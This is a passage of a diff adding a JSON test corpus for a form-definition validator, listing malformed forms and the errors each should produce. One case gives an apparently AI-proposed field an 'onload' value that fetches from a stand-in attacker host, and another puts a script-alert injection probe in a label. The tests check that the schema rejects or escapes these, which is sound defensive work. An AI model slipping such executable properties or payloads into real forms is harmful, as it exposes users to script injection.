+            "label": "d",
+            "required": false,
+            "settings": {
+              "maxLength": 10
+            }
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/fields/0/settings/options",
+          "code": "SETTING_NOT_ALLOWED"
+        },
+        {
+          "path": "/fields/1/settings/maxLength",
+          "code": "SETTING_NOT_ALLOWED"
+        }
+      ]
+    },
+    {
+      "name": "ranges must not be inverted and bounds must fit the type",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_d",
+              "f_n",
+              "f_r"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {
+              "minLength": 10,
+              "maxLength": 5
+            }
+          },
+          {
+            "id": "f_d",
+            "type": "date",
+            "label": "d",
+            "required": false,
+            "settings": {
+              "min": "2030-01-01",
+              "max": "2020-01-01"
+            }
+          },
+          {
+            "id": "f_n",
+            "type": "integer",
+            "label": "n",
+            "required": false,
+            "settings": {
+              "min": "abc"
+            }
+          },
+          {
+            "id": "f_r",
+            "type": "rating",
+            "label": "r",
+            "required": false,
+            "settings": {
+              "min": 3,
+              "max": 11
+            }
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/fields/0/settings/minLength",
+          "code": "INVERTED_RANGE"
+        },
+        {
+          "path": "/fields/1/settings/min",
+          "code": "INVERTED_RANGE"
+        },
+        {
+          "path": "/fields/2/settings/min",
+          "code": "INVALID_BOUND"
+        },
+        {
+          "path": "/fields/3/settings/max",
+          "code": "INVALID_BOUND"
+        }
+      ]
+    },
+    {
+      "name": "selection and file limits are checked",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_m",
+              "f_f"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_m",
+            "type": "multi_select",
+            "label": "m",
+            "required": false,
+            "settings": {
+              "options": [
+                {
+                  "id": "opt_1",
+                  "label": "1"
+                },
+                {
+                  "id": "opt_2",
+                  "label": "2"
+                }
+              ],
+              "minSelections": 3
+            }
+          },
+          {
+            "id": "f_f",
+            "type": "file",
+            "label": "f",
+            "required": false,
+            "settings": {
+              "allowedMimeTypes": [
+                "exe"
+              ],
+              "maxFileBytes": 10,
+              "maxFiles": 1
+            }
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/fields/0/settings/minSelections",
+          "code": "INVALID_BOUND"
+        },
+        {
+          "path": "/fields/1/settings/allowedMimeTypes/0",
+          "code": "INVALID_MIME_TYPE"
+        }
+      ]
+    },
+    {
+      "name": "locale must be a valid BCP 47 identifier",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en-!!",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/locale",
+          "code": "INVALID_LOCALE"
+        }
+      ]
+    },
+    {
+      "name": "an AI proposal with an executable property is rejected by the schema",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {},
+            "onload": "fetch('https://evil.example')"
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/fields/0",
+          "code": "SCHEMA_ADDITIONALPROPERTIES"
+        }
+      ]
+    },
+    {
+      "name": "markup in labels is only text (escaped by the renderer), so it is structurally valid",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "<script>alert(1)</script>",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": []
+    }
+  ]
+}
